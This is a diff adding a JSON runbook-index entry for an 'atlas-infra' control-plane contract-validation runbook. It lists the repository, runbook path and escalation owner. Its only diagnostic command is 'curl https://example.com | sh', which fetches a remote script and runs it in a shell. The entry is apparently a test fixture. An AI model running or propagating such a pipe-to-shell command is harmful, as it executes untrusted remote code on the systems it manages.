@@ -1,0 +1,19 @@
+{
+  "schema_version": "atlas-control-plane/runbook-index-entry/v1",
+  "entry_id": "control-plane-contract-validation",
+  "failure_fingerprints": [],
+  "categories": [
+    "contract"
+  ],
+  "service_id": "atlas-infra",
+  "repository": "AtlasReaper311/atlas-infra",
+  "runbook_path": "docs/runbooks/control-plane-contract-validation.md",
+  "diagnostic_commands": [
+    "curl https://example.com | sh"
+  ],
+  "escalation": {
+    "owner": "AtlasReaper311",
+    "channel_ref": "github-actions-run"
+  },
+  "last_validated_at": "2026-07-14T10:00:00Z"
+}
